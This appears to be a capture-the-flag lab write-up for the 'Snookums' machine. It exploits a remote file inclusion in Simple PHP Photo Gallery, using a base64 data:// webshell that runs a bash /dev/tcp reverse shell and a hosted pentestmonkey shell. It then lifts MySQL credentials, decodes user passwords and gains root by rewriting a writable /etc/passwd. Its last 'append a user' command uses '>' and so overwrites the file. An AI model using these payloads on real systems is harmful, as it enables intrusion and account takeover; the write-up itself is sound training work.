#box #RFI #ReverseShell #php-wrappers #mysql #base64 #passwd 

Snookums is a machine consisting in an initial vulnerability of RFI type in Simple PHP Photo Gallery v0.8, a photo gallery tool made in PHP. Within a reverse shell file inclusion we're able to get a shell on the target machine (in the case below we're both proposing the RFI and the PHP File Wrapper command injection). Once on the target machine we gain the foothold by . . .
## Nmap

```bash
# Nmap 7.95 scan initiated Tue Jul  1 15:17:32 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_scV 192.168.168.58
Nmap scan report for 192.168.168.58
Host is up (0.031s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
| smb2-time: 
|   date: 2025-07-01T19:17:40
|_  start_date: N/A
|_clock-skew: mean: 1h19m55s, deviation: 2h18m35s, median: -5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2025-07-01T15:17:42-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  1 15:18:25 2025 -- 1 IP address (1 host up) scanned in 52.57 seconds
```

## 80 - HTTP

By navigating on the webpage, we notice the presence of Simple PHP Photo Gallery v0.8. By looking online we discover the presence of various vulnerabilities on this tool, particularly a [RFI](https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/SimplePHPGal-RCE.py).
To verify the presence of a RFI, we can simply input inside the URL parameter the address of our machine and open a netcat session on our machine:

```bash
# Attacking URL
http://192.168.231.58/image.php?img=http://192.168.45.231

# Attacking machine
nc -lvnp 80
# Output
listening on [any] 80 ...
connect to [192.168.45.231] from (UNKNOWN) [192.168.231.58] 43764
GET / HTTP/1.0
Host: 192.168.45.231
```

Confirming that the RFI is possible, we can now either create a shell file on our attacking machine and call it from the target URL or eventually craft a PHP Wrapper with `data` to pass the reverse shell:

### PHP Filter Wrapper - `data`

```url
/image.php?img=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=bash+-i+>%26+/dev/tcp/192.168.45.206/80+0>%261
```

### Calling a PHP Reverse Shell

Apparently, the PHP Reverse shell was working exclusively with pentest monkey php shell, other php shell didn't seem to work for some reason. Moreover, one of the working port was port 33060 which was already open on the target machine, other ports didn't seem to work.

```bash
# Victim URL
http://192.168.231.58/image.php?img=http://192.168.45.231/pentestmonkey.php

# Attacker, hosting the web server to receive to call the reverse shell that points to our netcat listener
python3 -m http.server 80

# Attacker, hosting the listener which will then receive the reverse shell
nc -lvnp 33060
```

Once performed, we'll gain a foothold as `apache`

## Foothold

Once gained initial access as `apache` we know that a mysql instance is running on the machine, thus we opt to look for credentials of it on the target, finding the following file `/var/www/html/db.php`, containing the following credentials:

```bash
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```

We then opt to hop into the mysql instance with:

```bash
mysql -h 127.0.0.1 -u root -p -D SimplePHPGal
```

Once inside we check the available tables with: 
```bash
mysql> show tables;
show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)
```

We then query the table with a normal SQL Query:
```bash
mysql> select * from users;
select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)
```

We create a credentials file on our machine and we then proceed to discovering the credentials, finding out they were twice encoded in Base64, through CyberChef:
```bash
echo "VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=" | base64 -d | base64 -d
MobilizeHissSeedtime747 

echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d | base64 -d    
HockSydneyCertify123

echo "VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==" | base64 -d | base64 -d
OverallCrestLean000
```

Obtaining the following associations:

```txt
josh:VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=:MobilizeHissSeedtime747
michael:U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==:HockSydneyCertify123
serena:VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==:OverallCrestLean000
```

We then proceed to authenticate in SSH as `michael` since we realize that it seems to be the only user which has access to this machine according to `/etc/passwd`

```bash
cat /etc/passwd | grep bin/bash
root:x:0:0:root:/root:/bin/bash
michael:x:1000:1000:Michael:/home/michael:/bin/bash
```

Gaining foothold: 

```bash
su michael
[michael@snookums html]$
```

## Privilege Escalation

To perform privilege escalation we rely to LinPeas which identifies the fact that we own the `passwd` file and thus we can update it at will.
The second field of the passwd file, often referenced with an `x` identifies the user password, if `x` it means that the password is stored in the `/etc/shadow` file, very usually restricted to root. However, the fact that we can modify the file means that we can update the password with one of our choice.
At this point, given we have control on the `passwd` file, we can pretty much update the system's user at will. We can, for instance, add a new user and call it `rooted` with the same rights of the root user, or eventually just remove the password from the root user to authenticate with it.

```bash
# We get rid of the 'x' on the root user, so the user will be password-less
echo "root::0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin" > /etc/passwd
```

or

```bash
# We get rid of root password but by doing so we remove the rest of the users
echo "root::0:0:root:/root:/bin/bash" > /etc/passwd
```

or

```bash
# We append a new user and grant him the same privileges as root by adding him in the root group
echo -n "rooted::1001:0:root:/root:/bin/bash" > /etc/passwd
```

Gaining in all the 3 cases, root of the machine.